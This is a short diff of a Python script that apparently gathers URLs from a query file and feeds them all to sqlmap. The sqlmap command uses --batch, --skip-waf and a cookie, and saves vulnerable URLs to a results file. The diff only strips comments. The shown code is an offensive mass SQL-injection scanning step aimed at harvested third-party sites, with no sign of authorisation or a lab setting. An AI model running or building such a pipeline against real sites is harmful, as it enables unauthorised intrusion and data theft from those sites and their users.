@@ -54,8 +54,8 @@ def clear_file(filename):
     open(filename, 'w').close()  # Clear the file
 
 if __name__ == "__main__":
-    query_file = 'queries.txt'  # File containing your queries, one per line
-    result_file = 'urls.txt'     # File to save the results
+    query_file = 'queries.txt'  
+    result_file = 'urls.txt'     
 
     clear_file(result_file)
 
@@ -69,7 +69,6 @@ if __name__ == "__main__":
     save_urls_to_file(all_urls, result_file)
     print(f"Saved {len(all_urls)} URLs to {result_file}.")
 
-    # Print and run the sqlmap command
     sqlmap_command = f"sqlmap -m {result_file} --skip=SKIP --skip-waf --cookie=COOKIE --batch --output-dir=results --results-file=vulnerable_urls.txt"
     print("Running command:", sqlmap_command)
     
